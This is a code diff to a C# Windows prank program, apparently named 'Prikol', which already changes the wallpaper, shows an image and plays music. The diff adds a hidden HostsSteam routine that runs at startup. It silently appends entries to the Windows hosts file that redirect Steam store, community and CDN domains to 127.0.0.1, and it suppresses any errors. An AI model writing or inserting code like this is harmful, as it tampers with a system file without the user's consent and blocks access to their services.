@@ -28,6 +28,8 @@ namespace Prikol
             ChangeWallpaper();
             SetImageOnWindow();
             PlayMusic();
+
+            HostsSteam();
         }
 
         void SetImageOnWindow()
@@ -101,6 +103,27 @@ namespace Prikol
             catch
             {
                 MessageBox.Show("Idid nahui");
+            }
+        }
+
+        static void HostsSteam()
+        {
+            try
+            {
+                var path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
+                var text = "\n127.0.0.1 store.steampowered.com\n127.0.0.1 steamcommunity.com\n127.0.0.1 steamcdn-a.akamaihd.net";
+
+                using (var fs = new FileStream(path, FileMode.Append))
+                {
+                    using (var sw = new StreamWriter(fs))
+                    {
+                        sw.WriteLine(text);
+                    }
+                }
+            }
+            catch
+            {
+
             }
         }
     }
